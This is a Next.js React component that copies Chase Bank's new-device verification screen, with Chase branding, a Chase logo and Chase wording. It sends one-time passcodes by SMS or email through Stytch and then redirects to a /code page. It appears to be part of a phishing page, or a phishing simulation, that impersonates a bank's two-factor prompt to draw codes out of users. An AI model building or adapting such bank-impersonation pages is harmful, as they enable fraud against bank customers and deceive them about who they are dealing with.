"use client";

import { useStytch } from "@stytch/nextjs";
import React, { useCallback, useState } from "react";
import { useAuth } from "../contexts/AuthContext";

const Verify = () => {
  const stytch = useStytch();
  const { authState } = useAuth();

  const [contactMethod, setContactMethod] = useState("phone");
  const [error, setError] = useState("");

  const sendPhonePasscode = useCallback(async () => {
    try {
        const res = await stytch.otps.sms.send(authState.user?.phoneNumber, {
        expiration_minutes: 5,
        })
        console.debug(res)
    } catch(e) {
        setError('Error sending text. Try again.')
        console.log(e)
    }
  }, [stytch]);

  const sendEmailPasscode = useCallback(async () => {
    try {
        const res =  await stytch.otps.email.send(authState?.user?.email || "stytch6@gmail.com", {
        expiration_minutes: 5,
        })
        console.debug(res)
    } catch(e) {
        setError('Error sending email passcode. Try again.')
        console.log(e)
    }
  }, [stytch]);

  const handleMethodChange = (event) => {
    setContactMethod(event.target.value);
  };

  const handleNext = async () => {
    contactMethod === "phone" ? await sendPhonePasscode() : await sendEmailPasscode();
    window.location.href="/code"
  };

  return (
    <div
      style={{
        margin: "0",
        fontFamily: "Arial, sans-serif",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
      }}
    >
      <header
        style={{
          backgroundColor: "#0a59a5",
          textAlign: "center",
          width: "100%",
          height: "100%",
        }}
      >
        <img
          src="https://bankbonus.com/bank_logos/square/1-chase-bank.svg"
          alt="Chase Logo"
          style={{ maxWidth: "125px", height: "auto" }}
        />
      </header>
      <div
        style={{
          width: "600px",
          display: "flex",
          flexDirection: "column",
        }}
      >
        <p
          style={{
            fontSize: "26px",
            marginBottom: "12px",
            paddingTop: "30px",
          }}
        >
          We don’t recognize this device
        </p>
        <p
          style={{
            fontSize: "16px",
            color: "#555",
            paddingBottom: "25px",
            lineHeight: "20px",
          }}
        >
          It looks like you’re using a new device, or you changed its settings.
          Before you sign in, we need to confirm it’s you.
        </p>

        <p style={{ fontWeight: 400, fontSize: "18px" }}>
          How should we get in touch?
        </p>
        <div style={{ margin: "20px 0" }}>
          <label
            style={{
              marginBottom: "10px",
              fontSize: "15px",
              display: "flex",
            }}
          >
            <input
              type="radio"
              name="contact-method"
              value="notification"
              checked={contactMethod === "notification"}
              onChange={handleMethodChange}
              style={{ marginRight: "8px" }}
            />
            Send a notification to my phone (must have Chase app installed)
          </label>
          <label
            style={{
              display: "flex",
              alignItems: "center",
              marginBottom: "10px",
              fontSize: "15px",
            }}
          >
            <input
              type="radio"
              name="contact-method"
              value="phone"
              checked={contactMethod === "phone"}
              onChange={handleMethodChange}
              style={{ marginRight: "8px" }}
            />
            Send me a code via text
          </label>
          <label
            style={{
              display: "flex",
              alignItems: "center",
              marginBottom: "10px",
              fontSize: "15px",
            }}
          >
            <input
              type="radio"
              name="contact-method"
              value="email"
              checked={contactMethod === "email"}
              onChange={handleMethodChange}
              style={{ marginRight: "8px" }}
            />
            Send me a code via email
          </label>
          {error && (
          <div style={{ color: "#EF4444", marginTop: "6px", fontSize: "12px" }}>
            {error}
          </div>
        )}
          <a
            href="#"
            style={{
              display: "inline-block",
              marginTop: "10px",
              color: "#0056b3",
              textDecoration: "none",
              fontSize: '14px'
            }}
          >
            I already have a code >
          </a>
        </div>
        <div
          style={{
            display: "flex",
            gap: 35,
            marginTop: "20px",
          }}
        >
          <button
            style={{
              background: "#f5f5f5",
              border: "1px solid #e0e0e0",
              padding: "8px 15px",
              borderRadius: "4px",
              cursor: "pointer",
              width: "80px",
            }}
          >
            Cancel
          </button>
          <button
            onClick={handleNext}
            style={{
              background: "#0073e6",
              color: "#fff",
              border: "none",
              padding: "8px 15px",
              borderRadius: "4px",
              cursor: "pointer",
              width: "80px",
            }}
          >
            Next
          </button>
        </div>
      </div>
    </div>
  );
};

export default Verify;
